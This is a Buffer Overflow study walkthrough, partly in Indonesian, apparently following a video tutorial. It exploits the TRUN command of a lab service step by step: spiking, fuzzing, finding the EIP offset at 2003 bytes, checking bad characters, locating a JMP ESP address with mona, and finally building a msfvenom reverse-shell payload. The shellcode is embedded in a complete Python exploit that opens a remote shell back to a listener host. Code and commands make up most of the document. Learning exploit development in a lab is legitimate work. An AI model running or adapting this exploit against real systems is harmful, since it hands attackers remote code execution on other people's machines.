## Buffer Overflow (https://www.youtube.com/watch?v=ncBblM920jw&ab_channel=TheCyberMentor)
1. Stats and Trun Spiking, buat cari titik yang lemah

```stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```
`generic_send_tcp [ip_vuln_service] [port_vuln_service] stats.spk 0 0`

```trun.spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
`generic_send_tcp [ip_vuln_service] [port_vuln_service] trun.spk 0 0`

2. Fuzzing
```py
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.0.106', 9999))

		payload = 'TRUN /.:/' + buffer

		s.send((payload()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()

```
*Fuzzing crashed at 3000 bytes*

3. Finding offset (EIP), pattern create
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <berapa bytes tadi crashnya>`

```py
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106', 9999))
	
	payload = 'TRUN /.:/' + offset

	s.send((payload.encode()))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()


```
Crash, dan value EIPnya segini
EIP 386F4337

4. Pattern offset
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <bytes crash fuzzing> -q <address hex di EIP>`
`[*] Exact match at offset 2003`

Value ini guna buat kontrol EIPnya. EIPnya mulai pas setelah 2003 bytes, dan EIPnya itu ntar 4 bytes

```py
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106', 9999))

	payload = 'TRUN /.:/' + shellcode

	s.send((payload.encode()))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()

```

EIP 42424242

Berarti bener, B kita masuk ke EIP semua. Tinggal generate shellcode


5. Bad Characters (WINDOWS HARUS CARI)
https://github.com/cytopia/badchars

```py
#!/usr/bin/python3
import sys, socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106', 9999))

	payload = 'TRUN /.:/' + shellcode

	s.send((payload.encode()))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
```

6. ESP di Immunity debugger, klik kanan, `follow in dump`

Cari yg gk urut. Misal 01 02 03 B0 B0 06 07 etc.. Kemungkinan 04 05 itu badchars. Dan seterusnya.
Bener-bener cari, mata harus teliti. Cari yg out of place.

Catet semua badcharsnya, ini guna buat entar generate shell code.

Paling terakhir itu FF harusnya

**ATO GK GINI AJA, ABIS SETUP MONANYA BUAT GENERATE BADCHARS DLL, DARI PADA LIATIN SATU-SATU**
`!mona compare -f c:\mona\bytearray.bin -a <address ESP>`
`!mona compare -f c:\mona\bytearray.bin -a 00F5F9CC`

Nanti dia akan kasih possible Bad Chars


7. Finding the Right module (mona modules), Masukkin ke library immunity debuggernya
https://github.com/corelan/mona/blob/master/mona.py
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\mona.py

di bagian bawah Immunity dibugger, masukkin

`!mona modules`

Cari yg nempel ke binary yang vulnerable, dan cari yang protectionnya `False` semua.


8. Cari OPT code equivalent. Convert assembly language to hex code
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

nasm > JMP ESP
FFE4

jadi asmnya JMP ESP itu == `FFE4` di hex

**ATO GK GINI AJA**
`!mona jmp -r ESP -m "essfunc.dll"`


9. Cari JMP ESP di immunity debugger pake mona

`!mona find -s "\xff\xe4" -m <vuln_dll>`
`!mona find -s "\xff\xe4" -m essfunc.dll`

Nanti akan dapet list of return address. Kita cobain yang bisa satu-satu

0x625011af
0x625011bb
etc..

10. Update scriptnya

```py
#!/usr/bin/python3
import sys, socket

# 0x625011af <<little_endian>> \xaf\x11\x50\x62

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106', 9999))
	payload = 'TRUN /.:/' + shellcode
	s.send((payload.encode()))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()

```

Buka immunity debugger, pencet tanda panah biru ke kanan, masukkin addressnya (gk pake 0x). Kalo bener, harusnya
mendarat di `FFE4`

Kalo dah bener, pecet `f2` (buat set breakpoint)

baru jalanin scriptnya


11. GENERATE SHELLCODE (Final step)
`msfvenom -p windows/shell_reverse_tcp LHOST=<ip_listener> LPORT=<port_listener> EXITFUNC=thread -f c -a x86 -b "\x00"`
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.116 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`

-b ini adalah badcharsnya. karena tadi cuma \x00, yaudah masukkin itu aja. 

```py
#!/usr/bin/python3
import sys, socket

# 0x625011af <<little_endian>> \xaf\x11\x50\x62

overflow = (
b"\xdd\xc6\xb8\x8f\xdb\x8e\xdd\xd9\x74\x24\xf4\x5b\x2b\xc9"
b"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\xcc\xc8\x6c\x28\x2e"
b"\x06\xf2\xd3\xce\xd7\x93\x5a\x2b\xe6\x93\x39\x38\x59\x24"
b"\x49\x6c\x56\xcf\x1f\x84\xed\xbd\xb7\xab\x46\x0b\xee\x82"
b"\x57\x20\xd2\x85\xdb\x3b\x07\x65\xe5\xf3\x5a\x64\x22\xe9"
b"\x97\x34\xfb\x65\x05\xa8\x88\x30\x96\x43\xc2\xd5\x9e\xb0"
b"\x93\xd4\x8f\x67\xaf\x8e\x0f\x86\x7c\xbb\x19\x90\x61\x86"
b"\xd0\x2b\x51\x7c\xe3\xfd\xab\x7d\x48\xc0\x03\x8c\x90\x05"
b"\xa3\x6f\xe7\x7f\xd7\x12\xf0\x44\xa5\xc8\x75\x5e\x0d\x9a"
b"\x2e\xba\xaf\x4f\xa8\x49\xa3\x24\xbe\x15\xa0\xbb\x13\x2e"
b"\xdc\x30\x92\xe0\x54\x02\xb1\x24\x3c\xd0\xd8\x7d\x98\xb7"
b"\xe5\x9d\x43\x67\x40\xd6\x6e\x7c\xf9\xb5\xe6\xb1\x30\x45"
b"\xf7\xdd\x43\x36\xc5\x42\xf8\xd0\x65\x0a\x26\x27\x89\x21"
b"\x9e\xb7\x74\xca\xdf\x9e\xb2\x9e\x8f\x88\x13\x9f\x5b\x48"
b"\x9b\x4a\xcb\x18\x33\x25\xac\xc8\xf3\x95\x44\x02\xfc\xca"
b"\x75\x2d\xd6\x62\x1f\xd4\xb1\x4c\x48\xd6\x35\x25\x8b\xd6"
b"\xa4\xe9\x02\x30\xac\x01\x43\xeb\x59\xbb\xce\x67\xfb\x44"
b"\xc5\x02\x3b\xce\xea\xf3\xf2\x27\x86\xe7\x63\xc8\xdd\x55"
b"\x25\xd7\xcb\xf1\xa9\x4a\x90\x01\xa7\x76\x0f\x56\xe0\x49"
b"\x46\x32\x1c\xf3\xf0\x20\xdd\x65\x3a\xe0\x3a\x56\xc5\xe9"
b"\xcf\xe2\xe1\xf9\x09\xea\xad\xad\xc5\xbd\x7b\x1b\xa0\x17"
b"\xca\xf5\x7a\xcb\x84\x91\xfb\x27\x17\xe7\x03\x62\xe1\x07"
b"\xb5\xdb\xb4\x38\x7a\x8c\x30\x41\x66\x2c\xbe\x98\x22\x4c"
b"\x5d\x08\x5f\xe5\xf8\xd9\xe2\x68\xfb\x34\x20\x95\x78\xbc"
b"\xd9\x62\x60\xb5\xdc\x2f\x26\x26\xad\x20\xc3\x48\x02\x40"
b"\xc6")

# Padding NOPs "\x90" * 32 (no operation)

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106', 9999))

	payload = 'TRUN /.:/' + shellcode

	s.send((payload))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()
```
